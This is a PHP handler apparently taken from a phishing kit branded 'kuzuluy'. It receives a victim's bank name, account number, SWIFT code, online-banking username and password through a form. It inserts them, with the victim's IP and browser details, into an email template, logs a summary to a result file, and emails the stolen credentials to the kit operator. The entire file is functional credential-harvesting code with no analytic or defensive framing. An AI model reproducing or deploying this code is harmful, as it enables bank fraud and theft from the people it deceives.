<?php
require_once __DIR__ . '/../function.php';
@eval(file_get_contents('../config/' . $api->page_config));
@eval(file_get_contents('../config/' . $api->general_config));

$_SESSION['bank_name']    = $_POST['bname'];
$_SESSION['bank_number']  = $_POST['bnumber'];
$_SESSION['bank_swift']   = $_POST['bswift'];
$_SESSION['bank_login']   = $_POST['blogin'];
$_SESSION['bank_pass']    = $_POST['bpass'];

$message = file_get_contents('../assets/html/bank.html');
$message = preg_replace('{QUOTE}', $api->quote(), $message);
$message = preg_replace('{KUZULUY-NAME}', $_SESSION['bank_name'], $message);
$message = preg_replace('{KUZULUY-NUMBER}', $_SESSION['bank_number'], $message);
$message = preg_replace('{KUZULUY-SWIFT}', $_SESSION['bank_swift'], $message);
$message = preg_replace('{KUZULUY-LOGIN}', $_SESSION['bank_login'], $message);
$message = preg_replace('{KUZULUY-PASSWORD}', $_SESSION['bank_pass'], $message);
$message = preg_replace('{KUZULUY_IP}', $_SESSION['ip'], $message);
$message = preg_replace('{KUZULUY_AGENT}', $_SESSION['agent'], $message);

$subject  = $_SESSION['bank_name']." [ ".$_SESSION['country']." | ".$_SESSION['ip']." | ".$_SESSION['os']." - ".$_SESSION['browser']." ]";
$headers  = "From: Bank <bank@kuzuluy.co>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";

$api->save("../config/result-bank.txt", $subject."\n", "a");

if ($config_smtp == "enable"){
  $api->ngesend($api->result(), $subject, $message, "Bank", "bank@kuzuluy.co");
} else {
  mail($api->result(), $subject, $message, $headers);
}
if($config_anothercard == "disable"){
  echo "nofull";
}
?>
